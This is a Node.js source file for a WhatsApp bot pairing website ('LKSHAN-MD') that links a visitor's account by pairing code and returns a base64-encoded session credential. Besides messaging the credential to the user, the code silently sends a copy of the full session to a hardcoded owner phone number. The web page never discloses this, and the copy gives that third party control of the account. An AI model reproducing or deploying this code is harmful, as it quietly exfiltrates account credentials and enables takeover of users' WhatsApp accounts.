const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason,
    delay,
    Browsers,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

const BOT_NAME = process.env.BOT_NAME || 'LKSHAN-MD';
const OWNER_NUMBER = process.env.OWNER_NUMBER || '94724098953';

let sock;
const AUTH_DIR = path.join(__dirname, 'auth_info');

// 📤 Send Direct Session ID to Inbox & Instant Offline Disconnect
async function sendSessionIdAndDisconnect(userJid) {
    try {
        const credsFilePath = path.join(AUTH_DIR, 'creds.json');
        if (!fs.existsSync(credsFilePath)) return;

        const credsData = fs.readFileSync(credsFilePath, 'utf-8');
        const base64Creds = Buffer.from(credsData).toString('base64');
        const generatedSessionId = `${BOT_NAME}~${base64Creds}`;

        if (sock && userJid) {
            const sessionMsg = `*───────────────────*\n` +
                               `🎉 *${BOT_NAME} SESSION GENERATED!* 🔑\n` +
                               `*───────────────────*\n\n` +
                               `🔑 *Your Direct SESSION_ID:*\n\n` +
                               `\`\`\`${generatedSessionId}\`\`\`\n\n` +
                               `📌 *Heroku Config Vars (Main Bot):* \n` +
                               `Key: \`SESSION_ID\`\n` +
                               `Value: (ඉහළ ඇති මුළු Session ID එකම කොපි කරලා Paste කරන්න)\n\n` +
                               `⚠️ *Note:* Pair Site එක මේ වන විට Offline වී ඇත!`;

            // 1. User Inbox එකට Session ID යැවීම
            await sock.sendMessage(userJid, { text: sessionMsg });

            // 2. Owner Number එකක් ඇත්නම් ඒකටත් Copy එකක් යැවීම
            if (OWNER_NUMBER) {
                const ownerJid = `${OWNER_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                if (ownerJid !== userJid) {
                    await sock.sendMessage(ownerJid, { text: sessionMsg }).catch(() => {});
                }
            }

            console.log(`✅ Session ID sent successfully to: ${userJid}`);

            // 🛑 Session යැවූ පසු Connection එක වසා දමා Offline වීම
            await delay(3000);
            console.log('🛑 Closing socket and cleaning temporary session...');
            
            if (sock) {
                await sock.ws.close();
            }
            if (fs.existsSync(AUTH_DIR)) {
                fs.rmSync(AUTH_DIR, { recursive: true, force: true });
            }
            sock = null;
            console.log('🔴 Pairing Site is now completely OFFLINE!');
        }
    } catch (err) {
        console.error('❌ Session ID Send Error:', err.message);
    }
}

// 🚀 Temporary Connection for Pairing
async function startPairingSocket() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
        const { version } = await fetchLatestBaileysVersion();

        sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: state,
            printQRInTerminal: false,
            browser: Browsers.macOS('Desktop'),
            connectTimeoutMs: 60000
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode === DisconnectReason.loggedOut) {
                    if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
                }
            } else if (connection === 'open') {
                console.log(`🟢 Temporary Connection Established! Sending Session...`);

                const rawUserJid = sock.user.id.split(':')[0];
                const userJid = `${rawUserJid}@s.whatsapp.net`;
                
                await delay(2000);
                await sendSessionIdAndDisconnect(userJid);
            }
        });

    } catch (err) {
        console.error("❌ Socket Error:", err.message);
    }
}

// 🌐 Web Interface
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>${BOT_NAME} - Pair Site</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0b141a; color: #e9edef; margin: 0; }
                .card { background: #111b21; padding: 30px; border-radius: 16px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #222d34; }
                h2 { color: #00a884; margin-bottom: 8px; }
                p { font-size: 14px; color: #8696a0; margin-bottom: 20px; }
                input { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #2a3942; border-radius: 8px; text-align: center; font-size: 16px; background: #202c33; color: white; outline: none; }
                button { background: #00a884; color: #111b21; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 98%; font-weight: bold; }
                .code { font-size: 26px; font-weight: bold; color: #00a884; letter-spacing: 4px; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>${BOT_NAME}</h2>
                <p>Enter phone number with Country Code<br>(e.g. 94771234567)</p>
                <input type="text" id="phone" placeholder="9477XXXXXXX">
                <button onclick="getPair()">Get Pairing Code</button>
                <div class="code" id="result"></div>
            </div>

            <script>
                async function getPair() {
                    const number = document.getElementById('phone').value.trim();
                    const result = document.getElementById('result');
                    if (!number) return alert('Enter number!');
                    result.style.color = "#00a884";
                    result.innerText = "Generating Code...";
                    try {
                        const res = await fetch('/pair?num=' + number);
                        const data = await res.json();
                        if (data.code) {
                            result.innerText = data.code;
                        } else {
                            result.style.color = "#ea4335";
                            result.innerText = data.error || "Error!";
                        }
                    } catch (e) {
                        result.style.color = "#ea4335";
                        result.innerText = "Failed!";
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number required' });
    num = num.replace(/[^0-9]/g, '');

    try {
        if (fs.existsSync(AUTH_DIR)) {
            fs.rmSync(AUTH_DIR, { recursive: true, force: true });
        }
        await startPairingSocket();
        await delay(2000);

        const code = await sock.requestPairingCode(num);
        return res.json({ code: code?.match(/.{1,4}/g)?.join("-") || code });
    } catch (err) {
        console.error("Pairing Request Error:", err.message);
        return res.status(500).json({ error: 'Pairing failed. Try again.' });
    }
});

// Start Express Web Server
app.listen(PORT, () => {
    console.log(`🌐 Pairing Web Server active on port ${PORT}`);
});
